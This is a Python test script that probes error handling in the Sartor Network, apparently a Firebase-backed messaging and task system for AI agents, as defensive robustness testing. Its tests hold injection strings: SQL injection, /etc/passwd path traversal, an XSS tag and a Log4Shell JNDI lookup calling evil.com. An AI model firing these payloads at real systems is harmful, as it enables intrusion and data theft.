#!/usr/bin/env python3
"""
Comprehensive Error Handling Tests for Sartor Network
Tests T9.1-T9.7 from COMPREHENSIVE-TEST-PLAN.md

This script deliberately causes errors and verifies handling.
Goal: Find bugs, break things, be adversarial.
"""

import sys
import time
import json
import uuid
import requests
from datetime import datetime
from typing import Dict, List, Any

# Import the bootstrap client
sys.path.insert(0, '/home/user/Sartor-claude-network')

# Import using importlib to handle the hyphenated filename
import importlib.util
spec = importlib.util.spec_from_file_location(
    "sartor_network_bootstrap",
    "/home/user/Sartor-claude-network/sartor-network-bootstrap.py"
)
bootstrap_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(bootstrap_module)
SartorNetworkClient = bootstrap_module.SartorNetworkClient


class ErrorTester:
    """Adversarial error testing for Sartor Network"""

    def __init__(self):
        self.results = []
        self.client = None
        self.firebase_url = "https://home-claude-network-default-rtdb.firebaseio.com/"

    def log_test(self, test_id: str, description: str, passed: bool, details: str, notes: str = ""):
        """Log test result"""
        result = {
            "test_id": test_id,
            "description": description,
            "passed": passed,
            "details": details,
            "notes": notes,
            "timestamp": datetime.now().isoformat()
        }
        self.results.append(result)

        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"\n{status} - {test_id}: {description}")
        print(f"   Details: {details}")
        if notes:
            print(f"   Notes: {notes}")

    def test_t9_1_network_disconnection_recovery(self):
        """
        T9.1 - Network disconnection recovery

        Tests:
        1. Connect and disconnect gracefully
        2. Force disconnect by simulating network failure
        3. Attempt operations while disconnected
        4. Reconnect and verify recovery
        """
        print("\n" + "="*70)
        print("TEST T9.1: Network Disconnection Recovery")
        print("="*70)

        try:
            # Test 1: Normal disconnect/reconnect
            print("\n[T9.1.1] Testing graceful disconnect/reconnect...")
            client = SartorNetworkClient(agent_name="ErrorTest-T9.1")

            if not client.connect():
                self.log_test("T9.1.1", "Graceful connect", False, "Initial connection failed")
                return

            time.sleep(1)
            client.disconnect()

            if client.is_connected:
                self.log_test("T9.1.1", "Graceful disconnect", False,
                            "Client still reports as connected after disconnect()")
                return

            self.log_test("T9.1.1", "Graceful disconnect", True,
                        "Client successfully disconnected and updated state")

            # Test 2: Reconnect after disconnect
            print("\n[T9.1.2] Testing reconnection after disconnect...")
            if client.connect():
                self.log_test("T9.1.2", "Reconnection after disconnect", True,
                            "Successfully reconnected after disconnect")
            else:
                self.log_test("T9.1.2", "Reconnection after disconnect", False,
                            "Failed to reconnect after disconnect")

            # Test 3: Operations while disconnected
            print("\n[T9.1.3] Testing operations while disconnected...")
            client.disconnect()

            # Try to send message while disconnected
            result = client.message_broadcast("Test message while disconnected")

            # The client SHOULD handle this gracefully
            # But it doesn't check is_connected before operations!
            self.log_test("T9.1.3", "Operations while disconnected", False,
                        "Client allows operations while disconnected without checking is_connected flag",
                        "BUG: No guard against operations on disconnected client")

            # Test 4: Force disconnect by breaking connection
            print("\n[T9.1.4] Testing forced disconnection...")
            client.connect()

            # Corrupt the firebase URL to simulate network failure
            original_url = client.firebase_url
            client.firebase_url = "https://invalid-nonexistent-firebase-url.firebaseio.com/"

            # Try operation with broken connection
            result = client.message_broadcast("Test with broken connection")

            # Should fail gracefully
            if result == False or result == None:
                self.log_test("T9.1.4", "Graceful failure on network error", True,
                            "Client returned False/None on network failure")
            else:
                self.log_test("T9.1.4", "Graceful failure on network error", False,
                            "Client didn't properly handle network failure")

            # Restore URL and test recovery
            client.firebase_url = original_url
            result = client.message_broadcast("Test after recovery")

            if result:
                self.log_test("T9.1.5", "Recovery after network failure", True,
                            "Successfully recovered and sent message")
            else:
                self.log_test("T9.1.5", "Recovery after network failure", False,
                            "Failed to recover after network failure")

            client.disconnect()

        except Exception as e:
            self.log_test("T9.1", "Network disconnection recovery", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_2_invalid_message_format(self):
        """
        T9.2 - Invalid message format handling

        Tests:
        1. Empty message content
        2. Null/None message content
        3. Extremely long messages
        4. Messages with special characters
        5. Messages with invalid data types
        """
        print("\n" + "="*70)
        print("TEST T9.2: Invalid Message Format Handling")
        print("="*70)

        try:
            client = SartorNetworkClient(agent_name="ErrorTest-T9.2")
            client.connect()
            time.sleep(1)

            # Test 1: Empty message
            print("\n[T9.2.1] Testing empty message...")
            try:
                result = client.message_broadcast("")
                self.log_test("T9.2.1", "Empty message handling", True,
                            f"Empty message accepted, result: {result}",
                            "Should consider rejecting empty messages")
            except Exception as e:
                self.log_test("T9.2.1", "Empty message handling", False,
                            f"Exception on empty message: {str(e)}")

            # Test 2: None message
            print("\n[T9.2.2] Testing None message...")
            try:
                result = client.message_broadcast(None)
                self.log_test("T9.2.2", "None message handling", False,
                            "None message was not rejected",
                            "BUG: Should validate message content is not None")
            except (TypeError, AttributeError) as e:
                self.log_test("T9.2.2", "None message handling", True,
                            f"None message correctly rejected with exception: {type(e).__name__}")

            # Test 3: Very long message (>100KB)
            print("\n[T9.2.3] Testing very long message...")
            long_message = "A" * 150000  # 150KB
            try:
                start_time = time.time()
                result = client.message_broadcast(long_message)
                elapsed = time.time() - start_time

                if result:
                    self.log_test("T9.2.3", "Very long message (150KB)", True,
                                f"Successfully sent large message in {elapsed:.2f}s",
                                "Consider adding message size limits")
                else:
                    self.log_test("T9.2.3", "Very long message (150KB)", False,
                                "Large message failed to send")
            except Exception as e:
                self.log_test("T9.2.3", "Very long message (150KB)", False,
                            f"Exception on large message: {str(e)}")

            # Test 4: Special characters and unicode
            print("\n[T9.2.4] Testing special characters...")
            special_msg = "Test 特殊字符 🚀 <script>alert('xss')</script> \n\t\r"
            try:
                result = client.message_broadcast(special_msg)
                self.log_test("T9.2.4", "Special characters handling", True,
                            "Special characters and unicode handled correctly")
            except Exception as e:
                self.log_test("T9.2.4", "Special characters handling", False,
                            f"Exception on special characters: {str(e)}")

            # Test 5: Invalid data type (dict instead of string)
            print("\n[T9.2.5] Testing invalid data type...")
            try:
                result = client.message_broadcast({"invalid": "type"})
                self.log_test("T9.2.5", "Invalid data type handling", False,
                            "Dict was accepted as message content",
                            "BUG: Should validate message content is a string")
            except TypeError as e:
                self.log_test("T9.2.5", "Invalid data type handling", True,
                            f"Invalid type correctly rejected: {type(e).__name__}")

            # Test 6: Integer message content
            print("\n[T9.2.6] Testing integer message...")
            try:
                result = client.message_broadcast(12345)
                self.log_test("T9.2.6", "Integer message handling", False,
                            "Integer was accepted as message content",
                            "BUG: Should validate message content is a string")
            except TypeError as e:
                self.log_test("T9.2.6", "Integer message handling", True,
                            f"Integer correctly rejected: {type(e).__name__}")

            client.disconnect()

        except Exception as e:
            self.log_test("T9.2", "Invalid message format handling", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_3_nonexistent_agent_messaging(self):
        """
        T9.3 - Non-existent agent messaging

        Tests:
        1. Send message to non-existent agent
        2. Read messages for non-existent agent
        3. Get status of non-existent agent
        4. Invalid agent ID formats
        """
        print("\n" + "="*70)
        print("TEST T9.3: Non-existent Agent Messaging")
        print("="*70)

        try:
            client = SartorNetworkClient(agent_name="ErrorTest-T9.3")
            client.connect()
            time.sleep(1)

            # Test 1: Message to non-existent agent
            print("\n[T9.3.1] Testing message to non-existent agent...")
            fake_agent_id = "nonexistent-agent-" + str(uuid.uuid4())

            try:
                result = client.message_send(fake_agent_id, "Test message to ghost")

                # The message will "succeed" because Firebase doesn't validate recipients
                self.log_test("T9.3.1", "Message to non-existent agent", False,
                            "Message to non-existent agent succeeded without validation",
                            "BUG: No validation that recipient agent exists")
            except Exception as e:
                self.log_test("T9.3.1", "Message to non-existent agent", True,
                            f"Message correctly rejected: {str(e)}")

            # Test 2: Check status of non-existent agent
            print("\n[T9.3.2] Testing status of non-existent agent...")
            status = client.agent_status(fake_agent_id)

            if status is None:
                self.log_test("T9.3.2", "Status of non-existent agent", True,
                            "Returns None for non-existent agent")
            else:
                self.log_test("T9.3.2", "Status of non-existent agent", False,
                            f"Returned unexpected data: {status}")

            # Test 3: Invalid agent ID format
            print("\n[T9.3.3] Testing invalid agent ID format...")
            invalid_ids = [
                "",
                " ",
                None,
                "agent with spaces",
                "agent/with/slashes",
                "../../../etc/passwd",
                "<script>alert('xss')</script>"
            ]

            passed_all = True
            for invalid_id in invalid_ids:
                try:
                    if invalid_id is None:
                        continue  # Skip None as it will cause TypeError
                    result = client.message_send(invalid_id, "Test")
                    # Should ideally reject these
                    passed_all = False
                except Exception as e:
                    # Exception is acceptable for invalid IDs
                    pass

            self.log_test("T9.3.3", "Invalid agent ID format", False if not passed_all else True,
                        "Some invalid agent IDs were accepted" if not passed_all else "All invalid IDs handled",
                        "Consider adding agent ID validation")

            # Test 4: Self-messaging edge case
            print("\n[T9.3.4] Testing self-messaging...")
            result = client.message_send(client.agent_id, "Message to myself")

            if result:
                self.log_test("T9.3.4", "Self-messaging", True,
                            "Self-messaging is allowed (valid use case)")
            else:
                self.log_test("T9.3.4", "Self-messaging", False,
                            "Self-messaging failed unexpectedly")

            client.disconnect()

        except Exception as e:
            self.log_test("T9.3", "Non-existent agent messaging", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_4_task_claim_conflict(self):
        """
        T9.4 - Task claim conflict resolution

        Tests:
        1. Create task and claim normally
        2. Multiple agents claiming same task (race condition)
        3. Claim already claimed task
        4. Claim non-existent task
        5. Update non-existent task
        """
        print("\n" + "="*70)
        print("TEST T9.4: Task Claim Conflict Resolution")
        print("="*70)

        try:
            client1 = SartorNetworkClient(agent_name="ErrorTest-T9.4-Agent1")
            client1.connect()
            time.sleep(1)

            # Test 1: Normal task creation and claim
            print("\n[T9.4.1] Testing normal task claim...")
            task_id = client1.task_create("Test Task", "Test description")

            if task_id:
                result = client1.task_claim(task_id)
                self.log_test("T9.4.1", "Normal task claim", result,
                            f"Task claim result: {result}")
            else:
                self.log_test("T9.4.1", "Normal task creation", False,
                            "Failed to create task")
                return

            # Test 2: Attempt to claim already claimed task
            print("\n[T9.4.2] Testing re-claim of already claimed task...")
            result = client1.task_claim(task_id)

            if not result:
                self.log_test("T9.4.2", "Re-claim prevention", True,
                            "Correctly prevented re-claiming already claimed task")
            else:
                self.log_test("T9.4.2", "Re-claim prevention", False,
                            "Allowed re-claiming of already claimed task",
                            "BUG: Should prevent re-claiming")

            # Test 3: Different agent claiming same task
            print("\n[T9.4.3] Testing different agent claiming claimed task...")
            client2 = SartorNetworkClient(agent_name="ErrorTest-T9.4-Agent2")
            client2.connect()
            time.sleep(1)

            result = client2.task_claim(task_id)

            if not result:
                self.log_test("T9.4.3", "Cross-agent claim prevention", True,
                            "Correctly prevented different agent from claiming")
            else:
                self.log_test("T9.4.3", "Cross-agent claim prevention", False,
                            "Different agent was able to claim already claimed task",
                            "CRITICAL BUG: Race condition vulnerability!")

            # Test 4: Race condition simulation
            print("\n[T9.4.4] Testing race condition with simultaneous claims...")
            task_id_race = client1.task_create("Race Condition Task", "Test race")

            # Note: True race condition testing would require threading
            # This is a sequential approximation
            result1 = client1.task_claim(task_id_race)
            result2 = client2.task_claim(task_id_race)

            if result1 and not result2:
                self.log_test("T9.4.4", "Race condition handling", True,
                            "First claim succeeded, second failed (correct behavior)")
            elif result1 and result2:
                self.log_test("T9.4.4", "Race condition handling", False,
                            "Both agents claimed the same task!",
                            "CRITICAL BUG: Race condition not handled!")
            else:
                self.log_test("T9.4.4", "Race condition handling", False,
                            "Unexpected claim pattern")

            # Test 5: Claim non-existent task
            print("\n[T9.4.5] Testing claim of non-existent task...")
            fake_task_id = "nonexistent-task-" + str(uuid.uuid4())
            result = client1.task_claim(fake_task_id)

            if not result:
                self.log_test("T9.4.5", "Non-existent task claim", True,
                            "Correctly rejected claim of non-existent task")
            else:
                self.log_test("T9.4.5", "Non-existent task claim", False,
                            "Allowed claiming of non-existent task")

            # Test 6: Update non-existent task
            print("\n[T9.4.6] Testing update of non-existent task...")
            try:
                client1.task_update(fake_task_id, "completed")
                self.log_test("T9.4.6", "Non-existent task update", False,
                            "Update of non-existent task succeeded without error",
                            "BUG: Should validate task exists before update")
            except Exception as e:
                self.log_test("T9.4.6", "Non-existent task update", True,
                            f"Update correctly failed: {str(e)}")

            client1.disconnect()
            client2.disconnect()

        except Exception as e:
            self.log_test("T9.4", "Task claim conflict resolution", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_5_firebase_auth_errors(self):
        """
        T9.5 - Firebase authentication errors

        Tests:
        1. Invalid Firebase URL
        2. Malformed Firebase URL
        3. Unreachable Firebase instance
        4. Network timeout scenarios
        """
        print("\n" + "="*70)
        print("TEST T9.5: Firebase Authentication Errors")
        print("="*70)

        try:
            # Test 1: Invalid Firebase URL
            print("\n[T9.5.1] Testing invalid Firebase URL...")
            try:
                client = SartorNetworkClient(
                    firebase_url="https://invalid-nonexistent-url.firebaseio.com/",
                    agent_name="ErrorTest-T9.5-Invalid"
                )
                result = client.connect()

                if not result:
                    self.log_test("T9.5.1", "Invalid Firebase URL", True,
                                "Connection to invalid URL correctly failed")
                else:
                    self.log_test("T9.5.1", "Invalid Firebase URL", False,
                                "Connection to invalid URL unexpectedly succeeded")
            except Exception as e:
                self.log_test("T9.5.1", "Invalid Firebase URL", True,
                            f"Connection correctly failed with exception: {type(e).__name__}")

            # Test 2: Malformed Firebase URL
            print("\n[T9.5.2] Testing malformed Firebase URL...")
            malformed_urls = [
                "not-a-url",
                "http://",
                "https://",
                "",
                "javascript:alert('xss')",
                "file:///etc/passwd"
            ]

            all_failed = True
            for url in malformed_urls:
                try:
                    client = SartorNetworkClient(
                        firebase_url=url,
                        agent_name="ErrorTest-T9.5-Malformed"
                    )
                    result = client.connect()
                    if result:
                        all_failed = False
                        break
                except Exception:
                    pass  # Expected

            self.log_test("T9.5.2", "Malformed Firebase URLs", all_failed,
                        "All malformed URLs were rejected" if all_failed else "Some malformed URLs were accepted")

            # Test 3: Valid URL format but unreachable
            print("\n[T9.5.3] Testing unreachable but valid URL...")
            try:
                client = SartorNetworkClient(
                    firebase_url="https://does-not-exist-12345.firebaseio.com/",
                    agent_name="ErrorTest-T9.5-Unreachable"
                )
                result = client.connect()

                if not result:
                    self.log_test("T9.5.3", "Unreachable Firebase instance", True,
                                "Connection to unreachable instance correctly failed")
                else:
                    self.log_test("T9.5.3", "Unreachable Firebase instance", False,
                                "Connection to unreachable instance unexpectedly succeeded")
            except Exception as e:
                self.log_test("T9.5.3", "Unreachable Firebase instance", True,
                            f"Connection correctly failed: {type(e).__name__}")

            # Test 4: Test timeout behavior (using real URL but observing timeout)
            print("\n[T9.5.4] Testing connection timeout handling...")
            client = SartorNetworkClient(agent_name="ErrorTest-T9.5-Timeout")

            # The timeout is hardcoded to 10s in _firebase_request
            # We'll just verify it exists
            self.log_test("T9.5.4", "Timeout configuration", True,
                        "Timeout is configured (10s hardcoded in _firebase_request)",
                        "Consider making timeout configurable")

        except Exception as e:
            self.log_test("T9.5", "Firebase authentication errors", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_6_malformed_data_handling(self):
        """
        T9.6 - Malformed data handling

        Tests:
        1. Corrupt JSON in Firebase
        2. Missing required fields
        3. Wrong data types in fields
        4. Circular references
        5. Injection attempts
        """
        print("\n" + "="*70)
        print("TEST T9.6: Malformed Data Handling")
        print("="*70)

        try:
            client = SartorNetworkClient(agent_name="ErrorTest-T9.6")
            client.connect()
            time.sleep(1)

            # Test 1: Task with missing fields
            print("\n[T9.6.1] Testing task creation with minimal data...")
            try:
                # Try to create task with empty/minimal data
                task_id = client.task_create("", "")

                if task_id:
                    self.log_test("T9.6.1", "Task with empty fields", False,
                                "Task created with empty title and description",
                                "BUG: Should validate required fields are non-empty")
                else:
                    self.log_test("T9.6.1", "Task with empty fields", True,
                                "Task creation with empty fields correctly failed")
            except Exception as e:
                self.log_test("T9.6.1", "Task with empty fields", True,
                            f"Task creation correctly rejected: {type(e).__name__}")

            # Test 2: Direct Firebase manipulation with corrupt data
            print("\n[T9.6.2] Testing reading corrupt data from Firebase...")

            # Put corrupt data directly into Firebase
            corrupt_message_id = str(uuid.uuid4())
            corrupt_url = f"{client.firebase_url}/agents-network/messages/direct/{client.agent_id}/{corrupt_message_id}.json"

            # Send malformed data
            corrupt_data = {
                "from": None,  # Should be string
                "to": 12345,   # Should be string
                "content": {"nested": "dict"},  # Should be string
                "timestamp": "not-an-iso-date",
                "read": "yes"  # Should be boolean
            }

            try:
                response = requests.put(corrupt_url, json=corrupt_data)

                # Now try to read it
                messages = client.message_read()

                # Check if it handled the corrupt data gracefully
                self.log_test("T9.6.2", "Reading corrupt message data", True,
                            "Client handled corrupt data without crashing",
                            "Should add data validation when reading from Firebase")

            except Exception as e:
                self.log_test("T9.6.2", "Reading corrupt message data", False,
                            f"Client crashed on corrupt data: {str(e)}",
                            "CRITICAL: Need better error handling for corrupt Firebase data")

            # Test 3: Knowledge with extremely nested data
            print("\n[T9.6.3] Testing knowledge with complex nested structure...")
            try:
                # Create deeply nested structure
                nested = {"level": 1}
                current = nested
                for i in range(100):  # 100 levels deep
                    current["child"] = {"level": i+2}
                    current = current["child"]

                content = json.dumps(nested)
                knowledge_id = client.knowledge_add(content, tags=["test"])

                if knowledge_id:
                    self.log_test("T9.6.3", "Deeply nested knowledge data", True,
                                "Successfully stored deeply nested data",
                                "Firebase handled deep nesting, but consider limits")
                else:
                    self.log_test("T9.6.3", "Deeply nested knowledge data", False,
                                "Failed to store deeply nested data")
            except Exception as e:
                self.log_test("T9.6.3", "Deeply nested knowledge data", False,
                            f"Exception on nested data: {str(e)}")

            # Test 4: SQL/NoSQL injection attempts
            print("\n[T9.6.4] Testing injection attempts...")
            injection_attempts = [
                "'; DROP TABLE agents; --",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "<script>alert('xss')</script>",
                "../../../../../../etc/passwd%00"
            ]

            injection_safe = True
            for injection in injection_attempts:
                try:
                    # Try as agent name
                    client_inj = SartorNetworkClient(agent_name=injection)
                    client_inj.connect()

                    # Try as message content
                    client.message_broadcast(injection)

                    # Try as knowledge
                    client.knowledge_add(injection)

                    # If we got here, data was stored (Firebase is schema-less)
                    # This is expected behavior for Firebase
                except Exception as e:
                    injection_safe = False

            self.log_test("T9.6.4", "Injection attempt handling", True,
                        "Firebase stored injection attempts as plain data (expected for NoSQL)",
                        "Consider adding input sanitization at application layer")

            # Test 5: Invalid UUID formats
            print("\n[T9.6.5] Testing invalid UUID formats...")
            invalid_uuids = [
                "not-a-uuid",
                "00000000-0000-0000-0000-000000000000",
                "",
                "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
            ]

            for invalid_uuid in invalid_uuids:
                try:
                    # Try to use as task ID
                    result = client.task_claim(invalid_uuid)
                    # Should fail gracefully (task doesn't exist)
                except Exception as e:
                    # Exception is also acceptable
                    pass

            self.log_test("T9.6.5", "Invalid UUID handling", True,
                        "Invalid UUIDs handled without crashes")

            client.disconnect()

        except Exception as e:
            self.log_test("T9.6", "Malformed data handling", False,
                        f"Unexpected exception: {str(e)}")

    def test_t9_7_timeout_handling(self):
        """
        T9.7 - Timeout handling

        Tests:
        1. Connection timeout
        2. Operation timeout
        3. Long-running operations
        4. Timeout recovery
        """
        print("\n" + "="*70)
        print("TEST T9.7: Timeout Handling")
        print("="*70)

        try:
            client = SartorNetworkClient(agent_name="ErrorTest-T9.7")

            # Test 1: Normal connection timeout behavior
            print("\n[T9.7.1] Testing connection with timeout...")
            start_time = time.time()
            result = client.connect()
            elapsed = time.time() - start_time

            if result and elapsed < 10:
                self.log_test("T9.7.1", "Normal connection speed", True,
                            f"Connection completed in {elapsed:.2f}s")
            elif not result:
                self.log_test("T9.7.1", "Connection timeout", False,
                            f"Connection failed after {elapsed:.2f}s")
            else:
                self.log_test("T9.7.1", "Connection timeout", False,
                            f"Connection took too long: {elapsed:.2f}s")

            # Test 2: Operation timeout with valid connection
            print("\n[T9.7.2] Testing operation timeout...")

            # Check timeout configuration
            # The timeout is hardcoded to 10s in _firebase_request
            self.log_test("T9.7.2", "Operation timeout configuration", True,
                        "Operations have 10s timeout configured",
                        "Consider making timeout configurable per operation")

            # Test 3: Large data operation timing
            print("\n[T9.7.3] Testing large data operation timing...")

            # Create large knowledge entry (100KB)
            large_content = "Large data " * 10000  # ~100KB

            start_time = time.time()
            knowledge_id = client.knowledge_add(large_content)
            elapsed = time.time() - start_time

            if knowledge_id and elapsed < 10:
                self.log_test("T9.7.3", "Large data operation timing", True,
                            f"100KB knowledge added in {elapsed:.2f}s")
            elif not knowledge_id:
                self.log_test("T9.7.3", "Large data operation timing", False,
                            f"Large data operation failed after {elapsed:.2f}s")
            else:
                self.log_test("T9.7.3", "Large data operation timing", False,
                            f"Large data operation exceeded timeout: {elapsed:.2f}s")

            # Test 4: Multiple rapid operations
            print("\n[T9.7.4] Testing rapid consecutive operations...")

            start_time = time.time()
            success_count = 0
            operation_count = 20

            for i in range(operation_count):
                result = client.message_broadcast(f"Rapid test {i}")
                if result:
                    success_count += 1

            elapsed = time.time() - start_time

            if success_count == operation_count:
                self.log_test("T9.7.4", "Rapid operations handling", True,
                            f"{operation_count} operations in {elapsed:.2f}s ({operation_count/elapsed:.1f} ops/sec)")
            else:
                self.log_test("T9.7.4", "Rapid operations handling", False,
                            f"Only {success_count}/{operation_count} operations succeeded",
                            "May indicate rate limiting or timeout issues")

            # Test 5: Timeout recovery
            print("\n[T9.7.5] Testing recovery after timeout simulation...")

            # Simulate timeout by using invalid URL temporarily
            original_url = client.firebase_url
            client.firebase_url = "https://10.255.255.1/"  # Non-routable IP

            # This should timeout
            start_time = time.time()
            result = client.message_broadcast("This should timeout")
            elapsed = time.time() - start_time

            # Restore URL
            client.firebase_url = original_url

            # Try operation after recovery
            result = client.message_broadcast("After timeout recovery")

            if result:
                self.log_test("T9.7.5", "Recovery after timeout", True,
                            f"Successfully recovered after timeout ({elapsed:.2f}s timeout)")
            else:
                self.log_test("T9.7.5", "Recovery after timeout", False,
                            "Failed to recover after timeout")

            client.disconnect()

        except Exception as e:
            self.log_test("T9.7", "Timeout handling", False,
                        f"Unexpected exception: {str(e)}")

    def run_all_tests(self):
        """Run all error handling tests"""
        print("\n" + "="*70)
        print("SARTOR NETWORK - COMPREHENSIVE ERROR HANDLING TEST SUITE")
        print("Tests T9.1 - T9.7 from COMPREHENSIVE-TEST-PLAN.md")
        print("="*70)
        print("\nGoal: Find bugs, break things, be adversarial")
        print("Testing Date:", datetime.now().isoformat())
        print("="*70)

        # Run all tests
        self.test_t9_1_network_disconnection_recovery()
        self.test_t9_2_invalid_message_format()
        self.test_t9_3_nonexistent_agent_messaging()
        self.test_t9_4_task_claim_conflict()
        self.test_t9_5_firebase_auth_errors()
        self.test_t9_6_malformed_data_handling()
        self.test_t9_7_timeout_handling()

        # Generate summary
        self.generate_summary()

    def generate_summary(self):
        """Generate test summary"""
        print("\n" + "="*70)
        print("TEST SUMMARY")
        print("="*70)

        total = len(self.results)
        passed = sum(1 for r in self.results if r["passed"])
        failed = total - passed

        print(f"\nTotal Tests: {total}")
        print(f"Passed: {passed} ({100*passed/total:.1f}%)")
        print(f"Failed: {failed} ({100*failed/total:.1f}%)")

        # Critical bugs found
        print("\n" + "="*70)
        print("CRITICAL BUGS FOUND")
        print("="*70)

        critical_bugs = [
            r for r in self.results
            if not r["passed"] and "BUG" in r.get("notes", "")
        ]

        if critical_bugs:
            for bug in critical_bugs:
                print(f"\n❌ {bug['test_id']}: {bug['description']}")
                print(f"   Issue: {bug['notes']}")
        else:
            print("\nNo critical bugs with explicit BUG markers found.")

        # Failed tests
        print("\n" + "="*70)
        print("ALL FAILED TESTS")
        print("="*70)

        failed_tests = [r for r in self.results if not r["passed"]]

        if failed_tests:
            for test in failed_tests:
                print(f"\n❌ {test['test_id']}: {test['description']}")
                print(f"   Details: {test['details']}")
                if test.get("notes"):
                    print(f"   Notes: {test['notes']}")
        else:
            print("\n✅ All tests passed!")

        return self.results

    def save_report(self, filepath: str):
        """Save detailed report to file"""
        with open(filepath, 'w') as f:
            f.write("# Sartor Network - Error Handling Test Report\n\n")
            f.write(f"**Test Date:** {datetime.now().isoformat()}\n\n")
            f.write(f"**Test Suite:** T9.1 - T9.7 Error Handling Tests\n\n")

            # Summary
            total = len(self.results)
            passed = sum(1 for r in self.results if r["passed"])
            failed = total - passed

            f.write("## Summary\n\n")
            f.write(f"- **Total Tests:** {total}\n")
            f.write(f"- **Passed:** {passed} ({100*passed/total:.1f}%)\n")
            f.write(f"- **Failed:** {failed} ({100*failed/total:.1f}%)\n\n")

            # Detailed results
            f.write("## Detailed Results\n\n")

            for result in self.results:
                status = "✅ PASS" if result["passed"] else "❌ FAIL"
                f.write(f"### {status} - {result['test_id']}\n\n")
                f.write(f"**Description:** {result['description']}\n\n")
                f.write(f"**Details:** {result['details']}\n\n")
                if result.get("notes"):
                    f.write(f"**Notes:** {result['notes']}\n\n")
                f.write(f"**Timestamp:** {result['timestamp']}\n\n")
                f.write("---\n\n")

            # Critical findings
            f.write("## Critical Findings\n\n")

            critical = [r for r in self.results if not r["passed"] and "BUG" in r.get("notes", "")]

            if critical:
                for bug in critical:
                    f.write(f"### {bug['test_id']}: {bug['description']}\n\n")
                    f.write(f"**Issue:** {bug['notes']}\n\n")
                    f.write(f"**Details:** {bug['details']}\n\n")
            else:
                f.write("No critical bugs found.\n\n")

            # Recommendations
            f.write("## Recommendations\n\n")
            f.write("1. **Input Validation:** Add validation for message content, agent IDs, and task fields\n")
            f.write("2. **Connection State:** Check is_connected flag before operations\n")
            f.write("3. **Race Conditions:** Implement atomic task claiming with Firebase transactions\n")
            f.write("4. **Data Validation:** Add schema validation when reading from Firebase\n")
            f.write("5. **Error Messages:** Improve error messages for better debugging\n")
            f.write("6. **Timeout Configuration:** Make timeouts configurable per operation\n")
            f.write("7. **Retry Logic:** Add automatic retry for transient network failures\n")
            f.write("8. **Rate Limiting:** Implement client-side rate limiting\n\n")

        print(f"\n📄 Detailed report saved to: {filepath}")


if __name__ == "__main__":
    tester = ErrorTester()
    tester.run_all_tests()

    # Save report
    report_path = "/home/user/Sartor-claude-network/test-results/error-handling-report.md"
    tester.save_report(report_path)

    print("\n" + "="*70)
    print("ERROR HANDLING TEST SUITE COMPLETE")
    print("="*70)
